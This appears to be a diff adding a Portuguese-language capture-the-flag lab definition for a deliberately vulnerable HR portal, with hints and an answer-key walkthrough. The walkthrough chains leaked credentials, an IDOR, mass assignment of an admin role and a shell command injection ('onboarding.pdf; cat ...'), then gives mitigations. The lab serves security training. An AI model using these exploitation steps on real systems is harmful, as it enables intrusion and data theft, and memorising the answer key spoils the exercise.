@@ -1,0 +1,101 @@
+{
+  "slug": "machine-hr-onboarding",
+  "title": "Atlas HR",
+  "codename": "ATLAS HR",
+  "summary": "Um portal de integração de RH publica uma integração pack em um share público, vaza holerites de outros funcionários por uma rota de documentos desprotegida e aceita um `role` privilegiado na atualização de perfil. O conversor de documentos de RH então passa um nome de arquivo enviado para o shell.",
+  "category": "chain",
+  "difficulty": "medium",
+  "kind": "machine",
+  "lab_dir": "machine-hr-onboarding",
+  "estimated_minutes": 45,
+  "xp": 360,
+  "tech": [
+    "Flask",
+    "SQLite",
+    "Sessions",
+    "Shell",
+    "Recon"
+  ],
+  "tags": [
+    "machine",
+    "recon",
+    "exposed-data",
+    "idor",
+    "mass-assignment",
+    "privilege-escalation",
+    "command-injection",
+    "chaining"
+  ],
+  "story": "A Atlas People GmbH faz a integração de novos colaboradores por um portal self-service. O People Operations compartilhou a integração pack da turma de varejo em um share somente por link e esqueceu que ele também é rastreável por crawlers. Os documentos dos funcionários são servidos por id numérico sequencial com apenas uma verificação de login, e o formulário de perfil atualiza todos os campos que recebe — incluindo o role que o banco usa para autorização. O conversor de documentos de RH, escrito antes da atualização do LibreOffice, chama um helper de conversão via shell com o nome de arquivo enviado.",
+  "objective": "Recupere as credenciais de integração no share público para a flag de usuário, abuse do IDOR de documentos e de um mass assignment de perfil para se tornar `hr_admin` e ler a exportação de funcionários para a flag de API, e então injete um comando no conversor de documentos de RH para ler a flag de root.",
+  "rules": "A origem loopback atribuída é todo o escopo do engajamento. Não escaneie outras portas. As flags são dinâmicas e verificadas por estado.",
+  "flags": [
+    {
+      "key": "user",
+      "label": "Flag do novo colaborador",
+      "flag_type": "user",
+      "points": 70,
+      "required": true
+    },
+    {
+      "key": "api",
+      "label": "Flag da administração de RH",
+      "flag_type": "api",
+      "points": 110,
+      "required": true
+    },
+    {
+      "key": "root",
+      "label": "Flag root do conversor",
+      "flag_type": "root",
+      "points": 180,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Alguém compartilhou o welcome pack",
+      "body": "`/robots.txt` desautoriza `/share/` e a página de login aponta para ele. Abra `/share/atlas-onboarding-retail-2026.txt`; o pack contém um e-mail corporativo e a senha temporária de um novo colaborador. Entre em `/` e abra `/dashboard` para a flag de usuário.",
+      "cost": 15
+    },
+    {
+      "level": 2,
+      "title": "Documentos e roles não são para você escolher",
+      "body": "`/documents/payslip/4` pertence a um líder de folha de pagamento, não a você — a rota só verifica se você está autenticado. Em seguida edite seu perfil: o formulário só mostra nome, departamento e cargo, mas `POST /profile` também faz bind de `role`. Envie `role=hr_admin` e recarregue `/dashboard` para a flag de API e a lista `/admin/employees`.",
+      "cost": 25
+    },
+    {
+      "level": 3,
+      "title": "O conversor executa um shell",
+      "body": "Como `hr_admin`, abra `/admin/converter`. Ele executa `python3 -c '...' <file>` com o valor enviado anexado a um comando de shell. Envie `onboarding.pdf; cat /tmp/atlas-hr-root.txt`. A saída do comando é exibida na página e o objetivo é registrado.",
+      "cost": 40
+    }
+  ],
+  "solution": {
+    "walkthrough": "**Etapa 1 — share público até novo colaborador.** `GET /robots.txt` lista `/share/` e `/documents/`. A página de login aponta para o share onshape. `GET /share/atlas-onboarding-retail-2026.txt` retorna:\n\n```\nlogin: nadia.okafor@atlas-people.example\npassword: Atlas!Onboard26\n```\n\n```bash\ncurl -i -c jar -d 'username=nadia.okafor@atlas-people.example&password=Atlas!Onboard26' http://127.0.0.1:PORT/login\ncurl -b jar http://127.0.0.1:PORT/dashboard   # -> user flag\n```\n\n**Etapa 2 — IDOR + mass assignment.** Os documentos da própria Nadia são os ids 1–3. O dashboard dela aponta para `/documents/payslip/2`; mudar o id para `4` retorna o holerite de outubro da Payroll Lead Elena Vargas (a rota nunca compara `employee_id` com a sessão). O mesmo funciona entre tipos, por exemplo `/documents/payslip/6` (Chief People Officer).\n\n```bash\ncurl -b jar http://127.0.0.1:PORT/documents/payslip/4\ncurl -b jar -d 'full_name=Nadia Okafor&department=Sales&title=Sales Manager&role=hr_admin' http://127.0.0.1:PORT/profile\ncurl -b jar http://127.0.0.1:PORT/dashboard      # -> API flag, converter links\ncurl -b jar http://127.0.0.1:PORT/admin/employees  # full roster with salaries\n```\n\n**Etapa 3 — command injection no conversor.** `/admin/converter` exige `hr_admin`. Um envio normal (`onboarding.pdf`) exibe o banner do conversor. O valor é anexado a `python3 -c '...' <file>` sob `shell=True`, então um ponto e vírgula permite escapar:\n\n```bash\ncurl -b jar --data-urlencode 'file=onboarding.pdf; cat /tmp/atlas-hr-root.txt' http://127.0.0.1:PORT/admin/converter\n# -> converter banner + ': cat /tmp/atlas-hr-root.txt' output with the root flag\n```\n\nA flag de root aparece na saída do conversor e o objetivo é registrado.",
+    "root_cause": "A cadeia começa com um artefato de integração compartilhado além do seu público. A autorização nos documentos de funcionários verifica a autenticação, mas não a propriedade do objeto, e a atualização de perfil faz mass assignment de todos os campos enviados, então um novo colaborador consegue escalar para `hr_admin` com um campo extra no formulário. O conversor de RH então monta um comando de shell concatenando o nome de arquivo enviado, executando como a service account `atlas-hr`, que consegue ler o arquivo de root.",
+    "mitigation": "Armazene integração packs em um repositório autenticado, com expiração e por usuário, e nunca coloque credenciais em documentos compartilhados; rotacione o que for exposto. Imponha autorização em nível de objeto em toda leitura de documento (escope as consultas pelo id de funcionário da sessão). Faça bind apenas de uma allow-list explícita de campos de perfil e nunca aceite `role` do cliente — derive-o no servidor e exija reautenticação para mudanças de privilégio. Substitua a interpolação de shell por uma lista de argv e `shell=False`, valide nomes de arquivo contra uma allow-list estrita e execute o conversor em um sandbox sem acesso a segredos."
+  },
+  "references": [
+    {
+      "title": "OWASP API Security Top 10 2023 — A1: Broken Object Level Authorization",
+      "url": "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/",
+      "source_type": "standard",
+      "description": "Acesso a documentos por id sequencial sem verificação de propriedade."
+    },
+    {
+      "title": "PortSwigger — Mass assignment vulnerabilities",
+      "url": "https://portswigger.net/web-security/api-testing/mass-assignment",
+      "source_type": "official",
+      "description": "Bind de campos privilegiados, como role, a partir do corpo da request."
+    },
+    {
+      "title": "OWASP — OS Command Injection Defense Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Execução segura com argumentos para o conversor de documentos."
+    }
+  ]
+}
